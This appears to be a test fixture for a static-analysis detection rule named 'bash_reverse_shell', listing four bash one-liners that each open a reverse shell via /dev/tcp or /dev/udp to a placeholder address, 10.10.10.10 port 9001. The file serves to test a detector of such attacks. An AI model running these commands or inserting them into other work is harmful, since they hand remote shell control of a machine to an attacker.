# ruleid: bash_reverse_shell
sh -i >& /dev/udp/10.10.10.10/9001 0>&1

# ruleid: bash_reverse_shell
0<&196;exec 196<>/dev/tcp/10.10.10.10/9001; sh <&196 >&196 2>&196

# ruleid: bash_reverse_shell
exec 5<>/dev/tcp/10.10.10.10/9001;cat <&5 | while read line; do $line 2>&5 >&5; done

# ruleid: bash_reverse_shell
sh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5

